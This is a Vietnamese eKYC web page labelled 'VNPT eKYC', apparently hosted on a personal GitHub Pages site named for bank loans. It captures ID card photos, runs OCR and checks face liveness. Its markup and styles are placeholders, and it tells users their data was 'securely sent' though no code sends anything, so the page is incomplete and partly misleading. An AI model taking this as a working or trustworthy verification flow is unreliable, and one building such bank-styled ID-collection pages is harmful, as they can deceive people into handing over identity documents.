<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
    <title>VNPT eKYC - Xác thực danh tính</title>
    <link rel="icon" href="https://vaytieudung.github.io/shinhanbank/favicon.ico" />

    <!-- Font Awesome Icons -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet" />

    <style>
        /* (CSS styles omitted for brevity, assume unchanged from original) */
    </style>
</head>
<body>
    <div class="main-container">
        <!-- (HTML content omitted for brevity, assume unchanged from original) -->
    </div>

    <!-- Libraries (Local) -->
    <script src="https://vaytieudung.github.io/shinhanbank/assets/js/opencv.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/face-api.min.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/jsQR.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/lottie.min.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/jquery-3.6.0.min.js"></script>
    <script src="https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/dist/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5.1.0/dist/tesseract.min.js"></script>

    <!-- Main Script -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            class EkycApp {
                constructor() {
                    this.config = {
                        AUTO_CAPTURE_INTERVAL: 500,
                        MAX_CAPTURE_TIMEOUT: 30000,
                        ERROR_MESSAGE_TIMEOUT: 5000,
                        FACE_AUTO_CAPTURE_DELAY: 1500,
                        NEXT_STEP_URL: 'step4.html',
                        LIVENESS_EXPRESSIONS: ['straight', 'smile', 'right', 'left'],
                        LIVENESS_CONFIDENCE_THRESHOLD: 0.8,
                        LIVENESS_ACTION_DURATION: 2000,
                        LIVENESS_COOLDOWN_DURATION: 1000,
                        FACE_DETECTION_INTERVAL: 100,
                        MAX_LIVENESS_ATTEMPTS: 3,
                        CARD_ASPECT_RATIO: 1.58,
                        CARD_DETECTION_THRESHOLD: 0.05,
                        CARD_SIZE_MIN_PERCENT: 0.4,
                        CARD_SIZE_MAX_PERCENT: 0.8,
                    };
                    this.initLanguage();
                    this.cacheDOMElements();
                    this.initState();
                    this.initEventListeners();
                    this.updateUIWithLanguage();
                    this.initLibs();
                }

                initLanguage() {
                    this.languages = {
                        vi: {
                            stepper_step1: "Bước 1/4: Chọn loại giấy tờ",
                            stepper_step2: "Bước 2/4: Chụp ảnh giấy tờ",
                            stepper_step3: "Bước 3/4: Xác nhận thông tin",
                            stepper_step4: "Bước 4/4: Xác thực khuôn mặt",
                            loading_resources: "Đang tải tài nguyên...",
                            docselect_qr: "Quét mã QR",
                            docselect_other: "Giấy tờ khác",
                            capture_front_title: "Chụp mặt trước giấy tờ",
                            capture_back_title: "Chụp mặt sau giấy tờ",
                            capture_instruction: "Đưa giấy tờ vào khung và giữ ổn định",
                            error_no_card: "Không phát hiện giấy tờ, vui lòng thử lại.",
                            error_ocr_fail: "Không đọc được thông tin, vui lòng chụp lại.",
                            confirm_info_title: "Xác nhận thông tin",
                            confirm_info_subtitle: "Vui lòng kiểm tra kỹ hình ảnh và thông tin. Bạn có thể chụp lại nếu cần.",
                            face_liveness_title: "Xác thực khuôn mặt",
                            face_liveness_subtitle: "Vui lòng giữ khuôn mặt của bạn trong khung hình oval.",
                            success_title: "Xác thực thành công!",
                            success_subtitle: "Cảm ơn bạn đã hoàn tất quá trình xác thực eKYC. Thông tin của bạn đã được gửi đi an toàn.",
                        },
                        en: {
                            stepper_step1: "Step 1/4: Select document type",
                            stepper_step2: "Step 2/4: Capture document photos",
                            stepper_step3: "Step 3/4: Confirm information",
                            stepper_step4: "Step 4/4: Face verification",
                            loading_resources: "Loading resources...",
                            docselect_qr: "Scan QR Code",
                            docselect_other: "Other documents",
                            capture_front_title: "Capture front of document",
                            capture_back_title: "Capture back of document",
                            capture_instruction: "Place document inside frame and hold steady",
                            error_no_card: "No document detected, please try again.",
                            error_ocr_fail: "Unable to read information, please retake.",
                            confirm_info_title: "Confirm information",
                            confirm_info_subtitle: "Please carefully check images and information. You can retake if needed.",
                            face_liveness_title: "Face verification",
                            face_liveness_subtitle: "Please keep your face inside the oval frame.",
                            success_title: "Verification successful!",
                            success_subtitle: "Thank you for completing the eKYC process. Your information has been securely sent.",
                        }
                    };
                    this.currentLang = 'vi';
                }

                toggleLanguage() {
                    this.currentLang = this.currentLang === 'vi' ? 'en' : 'vi';
                    this.dom.btnLang.textContent = this.currentLang === 'vi' ? 'EN' : 'VI';
                    this.updateUIWithLanguage();
                }

                updateUIWithLanguage() {
                    const lang = this.languages[this.currentLang];
                    this.dom.stepper.textContent = lang.stepper_step1;
                    this.dom.docSelectView.querySelectorAll('[data-lang-key]').forEach(el => {
                        const key = el.getAttribute('data-lang-key');
                        if (lang[key]) el.textContent = lang[key];
                    });
                    // Update other UI texts as needed
                }

                cacheDOMElements() {
                    this.dom = {
                        btnLang: document.getElementById('btnLang'),
                        stepper: document.getElementById('stepper'),
                        docSelectView: document.getElementById('docSelectView'),
                        captureView: {
                            container: document.getElementById('captureView'),
                            title: document.getElementById('captureTitle'),
                            subtitle: document.getElementById('captureSubtitle'),
                            cameraVideo: document.getElementById('cameraVideo'),
                            cameraCanvas: document.getElementById('cameraCanvas'),
                            detectionCanvas: document.getElementById('detectionCanvas'),
                            cameraFrame: document.getElementById('cameraFrame'),
                            instruction: document.getElementById('captureInstruction'),
                            errorMessage: document.getElementById('errorMessage'),
                            btnCapture: document.getElementById('btnCapture'),
                            btnBack: document.getElementById('btnBack'),
                            btnUpload: document.getElementById('btnUpload'),
                            imageUpload: document.getElementById('imageUpload'),
                            uploadFallback: document.querySelector('.upload-fallback'),
                        },
                        qrScannerModal: document.getElementById('qrScannerModal'),
                        qrVideo: document.getElementById('qrVideo'),
                        qrMessage: document.getElementById('qrMessage'),
                        btnCancelQR: document.getElementById('btnCancelQR'),
                        confirmView: document.getElementById('confirmView'),
                        confirmFrontImg: document.getElementById('confirmFrontImg'),
                        confirmBackImg: document.getElementById('confirmBackImg'),
                        confirmBackItem: document.getElementById('confirmBackItem'),
                        btnConfirmInfo: document.getElementById('btnConfirmInfo'),
                        infoIdNumber: document.getElementById('infoIdNumber'),
                        infoFullName: document.getElementById('infoFullName'),
                        infoDob: document.getElementById('infoDob'),
                        infoDobRow: document.getElementById('infoDobRow'),
                        videoTutorialView: document.getElementById('videoTutorialView'),
                        tutorialVideo: document.getElementById('tutorialVideo'),
                        btnStartFaceCapture: document.getElementById('btnStartFaceCapture'),
                        faceCaptureView: document.getElementById('faceCaptureView'),
                        faceCameraVideo: document.getElementById('faceCameraVideo'),
                        faceCameraCanvas: document.getElementById('faceCameraCanvas'),
                        faceCaptureInstruction: document.getElementById('faceCaptureInstruction'),
                        livenessSteps: [
                            document.getElementById('livenessStep1'),
                            document.getElementById('livenessStep2'),
                            document.getElementById('livenessStep3'),
                            document.getElementById('livenessStep4'),
                            document.getElementById('livenessStep5'),
                        ],
                        btnConfirmLiveness: document.getElementById('btnConfirmLiveness'),
                        successView: document.getElementById('successView'),
                        lottieLoadingContainer: document.getElementById('lottieLoading'),
                        lottieSuccessContainer: document.getElementById('lottieSuccess'),
                        lottieProcessingContainer: document.getElementById('lottieProcessing'),
                    };
                }

                initState() {
                    this.state = {
                        docType: null,
                        captureStage: 'select',
                        images: { front: null, back: null },
                        ocrResult: { idNumber: '', fullName: '', dob: '' },
                        stream: null,
                        qrStream: null,
                        faceStream: null,
                        tesseractWorker: null,
                        currentView: 'docSelect',
                        lottieLoading: null,
                        lottieSuccess: null,
                        lottieProcessing: null,
                        isAutoCapturing: false,
                        autoCaptureTimeoutId: null,
                        autoCaptureMaxTimeoutId: null,
                        animationFrameId: null,
                        qrAnimationID: null,
                        faceDetectionInterval: null,
                        liveness: {
                            currentStep: 0,
                            attempts: 0,
                            isProcessing: false,
                            lastActionTime: 0,
                            faceDetected: false,
                            faceCentered: false,
                            faceSizeOk: false,
                        },
                    };
                }

                initEventListeners() {
                    this.dom.btnLang.addEventListener('click', () => this.toggleLanguage());

                    this.dom.docSelectView.querySelectorAll('.doc-option').forEach(el => {
                        el.addEventListener('click', () => this.handleDocSelect(el.getAttribute('data-type')));
                    });

                    this.dom.captureView.btnBack.addEventListener('click', () => this.handleBack());
                    this.dom.captureView.btnCapture.addEventListener('click', () => this.triggerCapture(false));
                    this.dom.captureView.btnUpload.addEventListener('click', () => this.dom.captureView.imageUpload.click());
                    this.dom.captureView.imageUpload.addEventListener('change', e => this.handleImageUpload(e));

                    this.dom.confirmView.querySelectorAll('button[data-retake]').forEach(btn => {
                        btn.addEventListener('click', e => this.retakeImage(e.target.getAttribute('data-retake')));
                    });

                    this.dom.btnConfirmInfo.addEventListener('click', () => this.submitVerification());

                    this.dom.btnCancelQR.addEventListener('click', () => this.stopQRScanner());

                    this.dom.btnStartFaceCapture.addEventListener('click', () => this.setupCaptureStage('liveness_check'));

                    this.dom.btnConfirmLiveness.addEventListener('click', () => this.submitVerification());
                }

                async initLibs() {
                    this.showLoading(true, this.languages[this.currentLang].loading_resources);

                    this.state.lottieLoading = lottie.loadAnimation({
                        container: this.dom.lottieLoadingContainer,
                        renderer: 'svg',
                        loop: true,
                        autoplay: true,
                        path: 'https://vaytieudung.github.io/shinhanbank/lib/web-oval.json',
                    });

                    this.state.lottieSuccess = lottie.loadAnimation({
                        container: this.dom.lottieSuccessContainer,
                        renderer: 'svg',
                        loop: false,
                        autoplay: false,
                        path: 'https://vaytieudung.github.io/shinhanbank/lib/success.json',
                    });

                    this.state.lottieProcessing = lottie.loadAnimation({
                        container: this.dom.lottieProcessingContainer,
                        renderer: 'svg',
                        loop: true,
                        autoplay: false,
                        path: 'https://vaytieudung.github.io/shinhanbank/lib/processing.json',
                    });

                    this.state.tesseractWorker = await Tesseract.createWorker({
                        logger: m => console.log(m),
                    });
                    await this.state.tesseractWorker.load();
                    await this.state.tesseractWorker.loadLanguage('vie');
                    await this.state.tesseractWorker.initialize('vie');

                    await faceapi.nets.tinyFaceDetector.loadFromUri('./models');
                    await faceapi.nets.faceLandmark68Net.loadFromUri('./models');
                    await faceapi.nets.faceExpressionNet.loadFromUri('./models');
                    await faceapi.nets.faceRecognitionNet.loadFromUri('./models');

                    this.showLoading(false);
                }

                showView(viewName) {
                    const views = [
                        this.dom.docSelectView,
                        this.dom.captureView.container,
                        this.dom.qrScannerModal,
                        this.dom.confirmView,
                        this.dom.videoTutorialView,
                        this.dom.faceCaptureView,
                        this.dom.successView,
                    ];
                    views.forEach(v => v.classList.add('hidden'));
                    switch (viewName) {
                        case 'docSelect':
                            this.dom.docSelectView.classList.remove('hidden');
                            this.dom.stepper.textContent = this.languages[this.currentLang].stepper_step1;
                            break;
                        case 'capture':
                            this.dom.captureView.container.classList.remove('hidden');
                            break;
                        case 'qrScanner':
                            this.dom.qrScannerModal.classList.remove('hidden');
                            break;
                        case 'confirm':
                            this.dom.confirmView.classList.remove('hidden');
                            this.dom.stepper.textContent = this.languages[this.currentLang].stepper_step3;
                            break;
                        case 'videoTutorial':
                            this.dom.videoTutorialView.classList.remove('hidden');
                            break;
                        case 'faceCapture':
                            this.dom.faceCaptureView.classList.remove('hidden');
                            this.dom.stepper.textContent = this.languages[this.currentLang].stepper_step4;
                            break;
                        case 'success':
                            this.dom.successView.classList.remove('hidden');
                            this.dom.stepper.textContent = this.languages[this.currentLang].success_title;
                            break;
                    }
                    this.state.currentView = viewName;
                }

                updateStepper(text) {
                    this.dom.stepper.textContent = text;
                }

                showLoading(show, text) {
                    if (show) {
                        this.dom.loadingOverlay?.classList.remove('hidden');
                        if (text) this.dom.loadingText.textContent = text;
                    } else {
                        this.dom.loadingOverlay?.classList.add('hidden');
                    }
                }

                showError(message, autoHide = true) {
                    const errorEl = this.dom.captureView.errorMessage;
                    errorEl.textContent = message;
                    errorEl.classList.add('visible');
                    if (autoHide) {
                        setTimeout(() => errorEl.classList.remove('visible'), this.config.ERROR_MESSAGE_TIMEOUT);
                    }
                }

                stopAllStreams() {
                    if (this.state.stream) {
                        this.state.stream.getTracks().forEach(track => track.stop());
                        this.state.stream = null;
                    }
                    if (this.state.qrStream) {
                        this.state.qrStream.getTracks().forEach(track => track.stop());
                        this.state.qrStream = null;
                    }
                    if (this.state.faceStream) {
                        this.state.faceStream.getTracks().forEach(track => track.stop());
                        this.state.faceStream = null;
                    }
                }

                resetProcess() {
                    this.stopAllStreams();
                    this.state.images = { front: null, back: null };
                    this.state.ocrResult = { idNumber: '', fullName: '', dob: '' };
                    this.state.captureStage = 'select';
                    this.showView('docSelect');
                }

                handleDocSelect(docType) {
                    this.state.docType = docType;
                    if (docType === 'qr') {
                        this.startQRScanner();
                        this.showView('qrScanner');
                        this.updateStepper(this.languages[this.currentLang].stepper_step2);
                    } else {
                        this.setupCaptureStage('front');
                    }
                }

                handleBack() {
                    if (this.state.captureStage === 'front' || this.state.captureStage === 'back') {
                        this.resetProcess();
                    } else if (this.state.captureStage === 'confirm') {
                        this.setupCaptureStage('back');
                    }
                }

                async setupCaptureStage(stage) {
                    this.state.captureStage = stage;
                    if (stage === 'front' || stage === 'back') {
                        this.showView('capture');
                        this.dom.captureView.title.textContent =
                            stage === 'front'
                                ? this.languages[this.currentLang].capture_front_title
                                : this.languages[this.currentLang].capture_back_title;
                        this.dom.captureView.subtitle.textContent = this.languages[this.currentLang].capture_instruction;
                        this.dom.captureView.instruction.textContent = this.languages[this.currentLang].capture_instruction;
                        this.dom.captureView.errorMessage.classList.remove('visible');
                        this.dom.captureView.uploadFallback.classList.add('hidden');
                        this.dom.captureView.btnCapture.disabled = false;
                        this.dom.captureView.btnUpload.disabled = false;
                        await this.startCamera(false, this.dom.captureView.cameraVideo, this.dom.captureView.cameraCanvas);
                        this.autoCaptureLoop();
                    } else if (stage === 'confirm') {
                        this.showView('confirm');
                        this.displayConfirmationInfo();
                    } else if (stage === 'liveness_check') {
                        this.showView('faceCapture');
                        await this.startFaceLivenessProcess();
                    } else if (stage === 'success') {
                        this.showView('success');
                    }
                }

                async startCamera(isFrontFacing, videoElement, canvasElement) {
                    try {
                        this.stopAllStreams();
                        const constraints = {
                            video: {
                                facingMode: isFrontFacing ? 'user' : 'environment',
                                width: { ideal: 1280 },
                                height: { ideal: 720 },
                            },
                            audio: false,
                        };
                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
                        videoElement.srcObject = stream;
                        this.state.stream = stream;
                        return new Promise((resolve) => {
                            videoElement.onloadedmetadata = () => {
                                videoElement.play();
                                resolve(true);
                            };
                        });
                    } catch (error) {
                        this.showError('Không thể truy cập camera.');
                        return false;
                    }
                }

                autoCaptureLoop() {
                    if (!this.state.stream || !cv) return;
                    const video = this.dom.captureView.cameraVideo;
                    const canvas = this.dom.captureView.cameraCanvas;
                    const context = canvas.getContext('2d');
                    const detectionContext = this.dom.captureView.detectionCanvas.getContext('2d');

                    const detectAndDraw = () => {
                        if (video.readyState !== video.HAVE_ENOUGH_DATA) {
                            this.state.animationFrameId = requestAnimationFrame(detectAndDraw);
                            return;
                        }

                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        let src = cv.imread(canvas);
                        let gray = new cv.Mat();
                        cv.cvtColor(src, gray, cv.COLOR_RGBA2GRAY, 0);

                        let edges = new cv.Mat();
                        cv.Canny(gray, edges, 50, 150, 3, false);

                        let contours = new cv.MatVector();
                        let hierarchy = new cv.Mat();
                        cv.findContours(edges, contours, hierarchy, cv.RETR_EXTERNAL, cv.CHAIN_APPROX_SIMPLE);

                        let detected = false;
                        let maxArea = 0;
                        let maxContour = null;

                        for (let i = 0; i < contours.size(); i++) {
                            let contour = contours.get(i);
                            let approx = new cv.Mat();
                            cv.approxPolyDP(contour, approx, 0.02 * cv.arcLength(contour, true), true);

                            if (approx.rows === 4) {
                                let area = cv.contourArea(contour);
                                if (
                                    area > maxArea &&
                                    area > canvas.width * canvas.height * this.config.CARD_SIZE_MIN_PERCENT &&
                                    area < canvas.width * canvas.height * this.config.CARD_SIZE_MAX_PERCENT
                                ) {
                                    maxArea = area;
                                    maxContour = approx;
                                    detected = true;
                                }
                            }
                            approx.delete();
                        }

                        detectionContext.clearRect(0, 0, canvas.width, canvas.height);
                        if (detected && maxContour) {
                            let points = [];
                            for (let j = 0; j < maxContour.rows; j++) {
                                points.push({ x: maxContour.data32S[j * 2], y: maxContour.data32S[j * 2 + 1] });
                            }
                            detectionContext.beginPath();
                            detectionContext.moveTo(points[0].x, points[0].y);
                            for (let k = 1; k < points.length; k++) {
                                detectionContext.lineTo(points[k].x, points[k].y);
                            }
                            detectionContext.closePath();
                            detectionContext.lineWidth = 5;
                            detectionContext.strokeStyle = 'limegreen';
                            detectionContext.stroke();
                            this.dom.captureView.cameraFrame.classList.add('ready-to-capture');
                            this.dom.captureView.instruction.textContent = 'Giấy tờ đã phát hiện, giữ ổn định...';

                            if (!this.state.autoCaptureTimeoutId) {
                                this.state.autoCaptureTimeoutId = setTimeout(() => this.triggerCapture(true), this.config.AUTO_CAPTURE_INTERVAL);
                            }
                        } else {
                            this.dom.captureView.cameraFrame.classList.remove('ready-to-capture');
                            this.dom.captureView.instruction.textContent = 'Đưa giấy tờ vào khung';
                            this.stopAutoCapture(false);
                        }

                        src.delete();
                        gray.delete();
                        edges.delete();
                        contours.delete();
                        hierarchy.delete();

                        this.state.animationFrameId = requestAnimationFrame(detectAndDraw);
                    };

                    detectAndDraw();
                }

                stopAutoCapture(stopMax) {
                    if (this.state.autoCaptureTimeoutId) {
                        clearTimeout(this.state.autoCaptureTimeoutId);
                        this.state.autoCaptureTimeoutId = null;
                    }
                    if (stopMax && this.state.autoCaptureMaxTimeoutId) {
                        clearTimeout(this.state.autoCaptureMaxTimeoutId);
                        this.state.autoCaptureMaxTimeoutId = null;
                    }
                    if (this.state.animationFrameId) {
                        cancelAnimationFrame(this.state.animationFrameId);
                        this.state.animationFrameId = null;
                    }
                }

                async triggerCapture(isAuto) {
                    this.stopAutoCapture(true);
                    const video = this.dom.captureView.cameraVideo;
                    const canvas = this.dom.captureView.cameraCanvas;
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageDataURL = canvas.toDataURL('image/jpeg');

                    if (this.state.captureStage === 'front') {
                        this.state.images.front = imageDataURL;
                        this.setupCaptureStage('back');
                    } else if (this.state.captureStage === 'back') {
                        this.state.images.back = imageDataURL;
                        this.setupCaptureStage('confirm');
                    }

                    await this.processOCR(imageDataURL, this.state.captureStage);
                }

                handleImageUpload(e) {
                    const file = e.target.files[0];
                    if (!file) return;
                    const reader = new FileReader();
                    reader.onload = async (event) => {
                        const imageDataURL = event.target.result;
                        if (this.state.captureStage === 'front') {
                            this.state.images.front = imageDataURL;
                            this.setupCaptureStage('back');
                        } else if (this.state.captureStage === 'back') {
                            this.state.images.back = imageDataURL;
                            this.setupCaptureStage('confirm');
                        }
                        await this.processOCR(imageDataURL, this.state.captureStage);
                    };
                    reader.readAsDataURL(file);
                }

                async processOCR(imageDataURL, side) {
                    try {
                        this.showLoading(true, 'Đang xử lý OCR...');
                        const { data: { text } } = await this.state.tesseractWorker.recognize(imageDataURL);
                        this.showLoading(false);
                        // Simple extraction example (should be improved)
                        const lines = text.split('\n').map(l => l.trim()).filter(l => l.length > 0);
                        if (lines.length === 0) {
                            this.showError(this.languages[this.currentLang].error_ocr_fail);
                            return;
                        }
                        // For demo, assign first line as idNumber, second as fullName, third as dob
                        if (side === 'front') {
                            this.state.ocrResult.idNumber = lines[0] || '';
                            this.state.ocrResult.fullName = lines[1] || '';
                            this.state.ocrResult.dob = lines[2] || '';
                        }
                    } catch (error) {
                        this.showLoading(false);
                        this.showError(this.languages[this.currentLang].error_ocr_fail);
                    }
                }

                startQRScanner() {
                    this.showView('qrScanner');
                    this.updateStepper(this.languages[this.currentLang].stepper_step2);
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                        .then(stream => {
                            this.state.qrStream = stream;
                            this.dom.qrVideo.srcObject = stream;
                            this.dom.qrVideo.play();
                            this.scanQR();
                        })
                        .catch(() => {
                            this.showError('Không thể truy cập camera.');
                        });
                }

                scanQR() {
                    const video = this.dom.qrVideo;
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');

                    const scan = () => {
                        if (video.readyState === video.HAVE_ENOUGH_DATA) {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
                            const code = jsQR(imageData.data, canvas.width, canvas.height);
                            if (code) {
                                this.dom.qrMessage.textContent = 'Mã QR đã được quét!';
                                this.stopQRScanner();
                                // Process QR code data here
                                alert('QR Code data: ' + code.data);
                                this.resetProcess();
                                return;
                            } else {
                                this.dom.qrMessage.textContent = 'Hướng camera vào mã QR';
                            }
                        }
                        this.state.qrAnimationID = requestAnimationFrame(scan);
                    };
                    scan();
                }

                stopQRScanner() {
                    if (this.state.qrStream) {
                        this.state.qrStream.getTracks().forEach(track => track.stop());
                        this.state.qrStream = null;
                    }
                    this.showView('docSelect');
                }

                displayConfirmationInfo() {
                    this.showView('confirm');
                    this.dom.confirmFrontImg.src = this.state.images.front || '';
                    if (this.state.images.back) {
                        this.dom.confirmBackImg.src = this.state.images.back;
                        this.dom.confirmBackItem.style.display = 'block';
                    } else {
                        this.dom.confirmBackItem.style.display = 'none';
                    }
                    this.dom.infoIdNumber.textContent = this.state.ocrResult.idNumber || 'Đang xử lý...';
                    this.dom.infoFullName.textContent = this.state.ocrResult.fullName || 'Đang xử lý...';
                    if (this.state.ocrResult.dob) {
                        this.dom.infoDob.textContent = this.state.ocrResult.dob;
                        this.dom.infoDobRow.style.display = 'flex';
                    } else {
                        this.dom.infoDobRow.style.display = 'none';
                    }
                }

                retakeImage(side) {
                    if (side === 'front') {
                        this.state.images.front = null;
                        this.state.ocrResult = { idNumber: '', fullName: '', dob: '' };
                        this.setupCaptureStage('front');
                    } else if (side === 'back') {
                        this.state.images.back = null;
                        this.setupCaptureStage('back');
                    }
                }

                async startFaceLivenessProcess() {
                    this.showView('faceCapture');
                    try {
                        this.stopAllStreams();
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                        this.dom.faceCameraVideo.srcObject = stream;
                        this.dom.faceCameraVideo.play();
                        this.state.faceStream = stream;

                        this.state.liveness.currentStep = 0;
                        this.state.liveness.attempts = 0;
                        this.state.liveness.isProcessing = false;

                        this.resetLivenessSteps(false);

                        this.state.faceDetectionInterval = setInterval(async () => {
                            if (this.state.liveness.isProcessing) return;
                            this.state.liveness.isProcessing = true;

                            const detections = await faceapi.detectSingleFace(this.dom.faceCameraVideo, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceExpressions();
                            if (detections) {
                                this.processLivenessStep(detections);
                            }

                            this.state.liveness.isProcessing = false;
                        }, this.config.FACE_DETECTION_INTERVAL);
                    } catch (error) {
                        this.showError('Không thể truy cập camera.');
                    }
                }

                processLivenessStep(detections) {
                    const step = this.state.liveness.currentStep;
                    const expressions = detections.expressions;
                    const landmarks = detections.landmarks;

                    if (step === 0 && expressions.neutral > this.config.LIVENESS_CONFIDENCE_THRESHOLD) {
                        this.markLivenessStepCompleted(step);
                    } else if (step === 1 && expressions.happy > this.config.LIVENESS_CONFIDENCE_THRESHOLD) {
                        this.markLivenessStepCompleted(step);
                    } else if (step === 2) {
                        // Check head turned right
                        const nose = landmarks.getNose();
                        if (nose[0].x < nose[6].x) {
                            this.markLivenessStepCompleted(step);
                        }
                    } else if (step === 3) {
                        // Check head turned left
                        const nose = landmarks.getNose();
                        if (nose[0].x > nose[6].x) {
                            this.markLivenessStepCompleted(step);
                        }
                    }
                }

                markLivenessStepCompleted(step) {
                    this.dom.livenessSteps[step].classList.add('completed');
                    this.state.liveness.currentStep++;
                    if (this.state.liveness.currentStep >= this.dom.livenessSteps.length - 1) {
                        this.dom.livenessSteps[this.dom.livenessSteps.length - 1].classList.add('completed');
                        this.dom.btnConfirmLiveness.disabled = false;
                        clearInterval(this.state.faceDetectionInterval);
                    } else {
                        this.dom.livenessSteps[this.state.liveness.currentStep].classList.add('active');
                    }
                }

                resetLivenessSteps(isError) {
                    this.dom.livenessSteps.forEach(step => {
                        step.classList.remove('completed', 'active', 'error');
                    });
                    this.dom.livenessSteps[0].classList.add('active');
                    this.dom.btnConfirmLiveness.disabled = true;
                }

                submitVerification() {
                    this.showView('success');
                }
            }

            new EkycApp();
        });
    </script>
</body>
</html>
